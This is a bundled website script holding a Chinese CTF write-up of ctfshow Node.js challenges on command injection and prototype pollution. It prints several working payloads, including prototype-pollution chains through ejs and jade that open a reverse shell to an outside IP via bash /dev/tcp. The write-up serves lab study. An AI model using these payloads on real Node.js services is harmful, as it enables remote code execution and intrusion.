"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7603],{8453:(e,r,n)=>{n.d(r,{R:()=>o,x:()=>l});var s=n(6540);const c={},i=s.createContext(c);function o(e){const r=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function l(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:o(e.components),s.createElement(i.Provider,{value:r},e.children)}},9311:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>t,contentTitle:()=>l,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow-nodejs","title":"ctfshow-nodejs","description":"\u547d\u4ee4\u6267\u884c","source":"@site/docs/CTF/CTFSHOW/ctfshow-nodejs.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow-nodejs","permalink":"/docs/CTF/CTFSHOW/ctfshow-nodejs","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow-nodejs.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshow-jwt","permalink":"/docs/CTF/CTFSHOW/ctfshow-jwt"},"next":{"title":"ctfshow-sql\u6ce8\u5165","permalink":"/docs/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165"}}');var c=n(4848),i=n(8453);const o={},l=void 0,t={},a=[{value:"\u547d\u4ee4\u6267\u884c",id:"\u547d\u4ee4\u6267\u884c",level:2},{value:"web334",id:"web334",level:3},{value:"web335",id:"web335",level:3},{value:"web336",id:"web336",level:3},{value:"web337",id:"web337",level:3},{value:"\u539f\u578b\u94fe\u6c61\u67d3",id:"\u539f\u578b\u94fe\u6c61\u67d3",level:2},{value:"web338",id:"web338",level:3},{value:"web339",id:"web339",level:3},{value:"web340",id:"web340",level:3},{value:"web341",id:"web341",level:3},{value:"web342\uff0c343",id:"web342343",level:3},{value:"web344",id:"web344",level:3}];function d(e){const r={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(r.h2,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,c.jsx)(r.h3,{id:"web334",children:"web334"}),"\n",(0,c.jsx)(r.p,{children:"login.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"var express = require('express'); // \u5f15\u5165express\u6a21\u5757\r\nvar router = express.Router();\r\nvar users = require('../modules/user').items; // \u5f15\u5165modules\u4e0b\u7684user.js\r\n \r\nvar findUser = function(name, password){\r\n  return users.find(function(item){\r\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\r\n  }); //toUpperCase()\u662fjavascript\u4e2d\u5c06\u5c0f\u5199\u8f6c\u6362\u6210\u5927\u5199\u7684\u51fd\u6570\r\n};\r\n\r\n/* GET home page. */\r\nrouter.post('/', function(req, res, next) { \r\n  res.type('html'); //\u8bbe\u7f6e\u54cd\u5e94\u5185\u5bb9\u4e3ahtml\r\n  var flag='flag_here';\r\n  var sess = req.session;\r\n  var user = findUser(req.body.username, req.body.password);\r\n \r\n  if(user){\r\n    req.session.regenerate(function(err) {\r\n      if(err){\r\n        return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'});        \r\n      }\r\n       \r\n      req.session.loginUser = user.username;\r\n      res.json({ret_code: 0, ret_msg: '\u767b\u5f55\u6210\u529f',ret_flag:flag});              \r\n    });\r\n  }else{\r\n    res.json({ret_code: 1, ret_msg: '\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef'});\r\n  }  \r\n  \r\n});\r\n\r\nmodule.exports = router;\n"})}),"\n",(0,c.jsx)(r.p,{children:"user.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"module.exports = {\r\n  items: [\r\n    {username: 'CTFSHOW', password: '123456'}\r\n  ]\r\n};\r\n\r\n// \u8fd9\u6bb5\u4ee3\u7801\u662f\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\uff0c\u901a\u8fc7module.exports\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5bfc\u51fa\n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"ctfshow\r\n123456\r\n\u767b\u5f55\u5c31\u884c\n"})}),"\n",(0,c.jsx)(r.h3,{id:"web335",children:"web335"}),"\n",(0,c.jsx)(r.p,{children:"\u67e5\u770b\u6e90\u7801"}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322122922266.png",alt:"image-20240322122922266"})}),"\n",(0,c.jsx)(r.p,{children:"\u53d1\u73b0\u6709\u4e2aeval\u53c2\u6570\uff0ceval\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u90a3\u8fd9\u4e00\u9898\u5c31\u662f\u8981\u547d\u4ee4\u6ce8\u5165\u4e86"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"require('child_process').execSync('ls')\r\nrequire('child_process').execSync('cat fl00g.txt')\r\nrequire('child_process').execSync('cat fl*').toString()\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"require('child_process').spawnSync('ls').stdout.toString()\r\nrequire('child_process').spawnSync('ls',['.']).stdout.toString()\r\nrequire('child_process').spawnSync('ls',['./']).stdout.toString()\r\nrequire('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() //\u4e0d\u80fd\u7528\u901a\u914d\u7b26\n"})}),"\n",(0,c.jsx)(r.h3,{id:"web336",children:"web336"}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.code,{children:"\u8fc7\u6ee4\u4e86/exec|load/i"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"require(\"child_process\")['exe'%2B'cSync']('ls')  //\u62fc\u63a5\u7ed5\u8fc7\r\nrequire('child_process').spawnSync('ls').stdout.toString()\r\nrequire('child_process').spawnSync('ls',['.']).stdout.toString()\r\nrequire('child_process').spawnSync('ls',['./']).stdout.toString()\r\nrequire('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() //\u4e0d\u80fd\u7528\u901a\u914d\u7b26\n"})}),"\n",(0,c.jsx)(r.h3,{id:"web337",children:"web337"}),"\n",(0,c.jsx)(r.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"var express = require('express');\r\nvar router = express.Router();\r\nvar crypto = require('crypto');\r\n\r\nfunction md5(s) {\r\n  return crypto.createHash('md5')\r\n    .update(s)\r\n    .digest('hex');\r\n}\r\n\r\n/* GET home page. */\r\nrouter.get('/', function(req, res, next) {\r\n  res.type('html');\r\n  var flag='xxxxxxx';\r\n  var a = req.query.a;\r\n  var b = req.query.b;\r\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\r\n  \tres.end(flag);\r\n  }else{\r\n  \tres.render('index',{ msg: 'tql'});\r\n  }\r\n  \r\n});\r\n\r\nmodule.exports = router;\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-js",children:"if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag))\n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"?a[c]=1&b[c]=2\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"> crypto.createHash('md5').update(a+'123').digest('hex');\r\n'48f823cf3792a401f42d1633c4b8ca4d'\r\n> crypto.createHash('md5').update(b+'123').digest('hex');\r\n'48f823cf3792a401f42d1633c4b8ca4d'\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"?a[]=1&b=1\n"})}),"\n",(0,c.jsxs)(r.blockquote,{children:["\n",(0,c.jsxs)(r.p,{children:[(0,c.jsx)(r.code,{children:"['a']+flag= = ='a'+flag"}),"\uff0c\u6bd4\u5982flag\u662fflag",123,"\uff0c\u90a3\u4e48\u6700\u540e\u5f97\u5230\u7684\u90fd\u662f",(0,c.jsx)(r.code,{children:"aflag[123}"}),"\uff0c\u56e0\u6b64\u8fd9\u4e2a\u4e5f\u80af\u5b9a\u6210\u7acb\uff1a",(0,c.jsx)(r.code,{children:"md5(['a']+flag)= = =md5('a'+flag)"}),"\uff0c\u540c\u65f6\u4e5f\u6ee1\u8db3a!==b"]}),"\n"]}),"\n",(0,c.jsxs)(r.blockquote,{children:["\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.code,{children:"?a[0]=1&b[0]=2 \u4e0d\u884c"})}),"\n",(0,c.jsxs)(r.p,{children:["\u4f46\u662f\u5982\u679c\u4f20",(0,c.jsx)(r.code,{children:"a[0]=1&b[0]=2"}),"\uff0c\u76f8\u5f53\u4e8e\u521b\u4e86\u4e2a\u53d8\u91cf",(0,c.jsx)(r.code,{children:"a=[1] b=[2]"}),"\uff0c\u518d\u50cf\u4e0a\u9762\u90a3\u6837\u6253\u5370\u7684\u65f6\u5019\uff0c",(0,c.jsx)(r.code,{children:"\u4f1a\u6253\u5370\u51fa1flag{xxx}\u548c2flag{xxx}"}),"\uff0cmd5\u4e0d\u76f8\u7b49"]}),"\n"]}),"\n",(0,c.jsx)(r.h2,{id:"\u539f\u578b\u94fe\u6c61\u67d3",children:"\u539f\u578b\u94fe\u6c61\u67d3"}),"\n",(0,c.jsx)(r.h3,{id:"web338",children:"web338"}),"\n",(0,c.jsx)(r.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,c.jsx)(r.p,{children:"login.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"var express = require('express');\r\nvar router = express.Router();\r\nvar utils = require('../utils/common');\r\n\r\n\r\n\r\n/* GET home page.  */\r\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\r\n  res.type('html');\r\n  var flag='flag_here';\r\n  var secert = {};\r\n  var sess = req.session;\r\n  let user = {};\r\n  utils.copy(user,req.body);\r\n  if(secert.ctfshow==='36dboy'){\r\n    res.end(flag);\r\n  }else{\r\n    return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'+JSON.stringify(user)});  \r\n  }\r\n  \r\n  \r\n});\r\n\r\nmodule.exports = router;\n"})}),"\n",(0,c.jsx)(r.p,{children:"common.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"module.exports = {\r\n  copy:copy\r\n};\r\n\r\nfunction copy(object1, object2){\r\n    for (let key in object2) {\r\n        if (key in object2 && key in object1) {\r\n            copy(object1[key], object2[key])\r\n        } else {\r\n            object1[key] = object2[key]\r\n        }\r\n    }\r\n  }\n"})}),"\n",(0,c.jsx)(r.p,{children:"\u8fd9\u4e2acopy\u51fd\u6570\u5c31\u662f\u5c06\u5bf9\u8c61\u8fdb\u884c\u9012\u5f52\u5408\u5e76"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:'Content-Type: application/json\r\n\r\n{"username":"2","password":"2","__proto__":{"ctfshow":"36dboy"}}\n'})}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322133415404.png",alt:"image-20240322133415404"})}),"\n",(0,c.jsx)(r.h3,{id:"web339",children:"web339"}),"\n",(0,c.jsx)(r.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,c.jsx)(r.p,{children:"login.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"router.post('/', require('body-parser').json(),function(req, res, next) {\r\n  res.type('html');\r\n  var flag='flag_here';\r\n  var secert = {};\r\n  var sess = req.session;\r\n  let user = {};\r\n  utils.copy(user,req.body);\r\n  if(secert.ctfshow===flag){\r\n    res.end(flag);\r\n  }else{\r\n    return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'+JSON.stringify(user)});  \r\n  }\r\n});\n"})}),"\n",(0,c.jsx)(r.p,{children:"common.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"module.exports = {\r\n  copy:copy\r\n};\r\n\r\nfunction copy(object1, object2){\r\n    for (let key in object2) {\r\n        if (key in object2 && key in object1) {\r\n            copy(object1[key], object2[key])\r\n        } else {\r\n            object1[key] = object2[key]\r\n        }\r\n    }\r\n  }\n"})}),"\n",(0,c.jsx)(r.p,{children:"api.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"var express = require('express');\r\nvar router = express.Router();\r\nvar utils = require('../utils/common');\r\n\r\n\r\n\r\n/* GET home page.  */\r\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\r\n  res.type('html');\r\n  res.render('api', { query: Function(query)(query)});\r\n    // \u901a\u8fc7 res.render() \u65b9\u6cd5\u6e32\u67d3\u540d\u4e3a 'api' \u7684\u89c6\u56fe\u6a21\u677f\uff0c\u5e76\u4f20\u9012\u4e00\u4e2a\u5305\u542b query \u5c5e\u6027\u7684\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u91cc\u4f7f\u7528\u4e86 Function(query) \u6765\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\uff0c\u5e76\u7acb\u5373\u8c03\u7528\u8be5\u51fd\u6570\u5e76\u4f20\u9012 query \u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u6837\u505a\u53ef\u80fd\u662f\u4e3a\u4e86\u5728\u89c6\u56fe\u6a21\u677f\u4e2d\u4f7f\u7528 query \u53d8\u91cf\u3002\r\n   \r\n});\r\n\r\nmodule.exports = router;\n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-json",children:'{"__proto__":{"query":"return global.process.mainModule.constructor._load(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\\"\')"}}\n'})}),"\n",(0,c.jsx)(r.p,{children:"\u67e5\u770blogin.js"}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322144733780.png",alt:"image-20240322144733780"})}),"\n",(0,c.jsx)(r.h3,{id:"web340",children:"web340"}),"\n",(0,c.jsx)(r.p,{children:"login.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"var express = require('express');\r\nvar router = express.Router();\r\nvar utils = require('../utils/common');\r\n\r\n\r\n/* GET home page.  */\r\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\r\n  res.type('html');\r\n  var flag='flag_here';\r\n  var user = new function(){\r\n    this.userinfo = new function(){\r\n    this.isVIP = false;\r\n    this.isAdmin = false;\r\n    this.isAuthor = false;     \r\n    };\r\n  }\r\n  utils.copy(user.userinfo,req.body);\r\n  if(user.userinfo.isAdmin){\r\n   res.end(flag);\r\n  }else{\r\n   return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'});  \r\n  }\r\n  \r\n  \r\n});\r\n\r\nmodule.exports = router;\n"})}),"\n",(0,c.jsx)(r.p,{children:"api.js"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"/* GET home page.  */\r\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\r\n  res.type('html');\r\n  res.render('api', { query: Function(query)(query)});\r\n   \r\n});\n"})}),"\n",(0,c.jsx)(r.p,{children:"\u53d8\u5316\u7684\u90e8\u5206"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"var user = new function(){\r\n    this.userinfo = new function(){\r\n    this.isVIP = false;\r\n    this.isAdmin = false;\r\n    this.isAuthor = false;     \r\n    };\r\n  }\r\n  utils.copy(user.userinfo,req.body);\r\n  if(user.userinfo.isAdmin){ // user.userinfo.isAdmin\u7684\u503c\u662ffalse\uff0c\u4e0d\u80fd\u901a\u8fc7\u539f\u578b\u94fe\u6c61\u67d3\u7c7b\u6539\u53d8\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u53ef\u80fd\u8f93\u51faflag\r\n   res.end(flag);\r\n  }else{\r\n   return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'});  \r\n  }\n"})}),"\n",(0,c.jsxs)(r.p,{children:["\u5c31\u7b97\u4fee\u6539\u4e86",(0,c.jsx)(r.code,{children:"Object"}),"\u7684",(0,c.jsx)(r.code,{children:"isAdmin"}),"\uff0c\u56e0\u4e3a",(0,c.jsx)(r.code,{children:"user.userinfo"}),"\u91cc\u6709",(0,c.jsx)(r.code,{children:"isAdmin"}),",\u6240\u4ee5\u4e0d\u4f1a\u5411\u4e0a\u5bfb\u627e"]}),"\n",(0,c.jsx)(r.p,{children:"\u5b50\u7c7b\u4e0d\u80fd\u6c61\u67d3\u7236\u7c7b\u5df2\u7ecf\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u53ea\u80fd\u65b0\u589e\u5c5e\u6027\u3002"}),"\n",(0,c.jsxs)(r.p,{children:["\u6240\u4ee5\u8fd9\u91cc\u6784\u9020",(0,c.jsx)(r.code,{children:"query"}),"\u5c5e\u6027"]}),"\n",(0,c.jsxs)(r.blockquote,{children:["\n",(0,c.jsx)(r.p,{children:"\u8fd9\u91cc\u9700\u8981\u6c61\u67d3\u4e24\u5c42"}),"\n",(0,c.jsx)(r.p,{children:"user.userinfo\u7684\u4e0a\u7ea7\u662fuser\uff0cuser\u7684\u4e0a\u7ea7\u624d\u662fObject"}),"\n"]}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-json",children:'{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\\"\')"}}\n'})}),"\n",(0,c.jsx)(r.h3,{id:"web341",children:"web341"}),"\n",(0,c.jsx)(r.p,{children:"\u5148\u4e0b\u4e00\u4e2a\u53ebsnyk\u7684\u5de5\u5177"}),"\n",(0,c.jsxs)(r.blockquote,{children:["\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"npm install -g snyk\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"snyk auth\n"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"snyk test\n"})}),"\n"]}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240324162648063.png",alt:"image-20240324162648063"})}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.a,{href:"https://blog.csdn.net/weixin_42176112/article/details/116654787",children:"Snyk \u4f9d\u8d56\u6027\u5b89\u5168\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177"})}),"\n",(0,c.jsx)(r.p,{children:"\u6709\u4e2aejs\u7684rce\u6f0f\u6d1e"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-json",children:'{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\\"\');var __tmp2"}}}\n'})}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240324162805916.png",alt:"image-20240324162805916"})}),"\n",(0,c.jsx)(r.h3,{id:"web342343",children:"web342\uff0c343"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsxs)(r.p,{children:["\u53c2\u8003\u94fe\u63a5",(0,c.jsx)(r.code,{children:"https://xz.aliyun.com/t/7025"})]}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-json",children:'{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/xxx/810>&1\\"\')"}}}\n'})}),"\n",(0,c.jsx)(r.h3,{id:"web344",children:"web344"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-javascript",children:"router.get('/', function(req, res, next) {\r\n  res.type('html');\r\n  var flag = 'flag_here';\r\n  if(req.url.match(/8c|2c|\\,/ig)){\r\n  \tres.end('where is flag :)');\r\n  }\r\n  var query = JSON.parse(req.query.query);\r\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\r\n  \tres.end(flag);\r\n  }else{\r\n  \tres.end('where is flag. :)');\r\n  }\r\n\r\n});\n"})}),"\n",(0,c.jsxs)(r.p,{children:[(0,c.jsx)(r.code,{children:"var query = JSON.parse(req.query.query)"}),"\u83b7\u53d6\u4e00\u4e2aquery\u53c2\u6570"]}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:'query={"name":"admin","password":"ctfshow","isVIP":true}\n'})}),"\n",(0,c.jsx)(r.p,{children:"\u4f46\u662f\u8fc7\u6ee4\u4e86\u9017\u53f7"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:'query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}\n'})}),"\n",(0,c.jsx)(r.p,{children:"\u8fd8\u8fc7\u6ee4\u4e862c\uff0c\u8fd9\u91cc\u53cc\u5f15\u53f7\u7684url\u7f16\u7801\u662f%22\uff0c\u548cc\u5b57\u7b26\u7ec4\u6210\u4e86%22c\uff0c\u88ab\u8fc7\u6ee4\u4e86\uff0c\u628ac\u5b57\u7b26\u8fdb\u884curl\u7f16\u7801"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:'query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}\n'})})]})}function p(e={}){const{wrapper:r}={...(0,i.R)(),...e.components};return r?(0,c.jsx)(r,{...e,children:(0,c.jsx)(d,{...e})}):d(e)}}}]);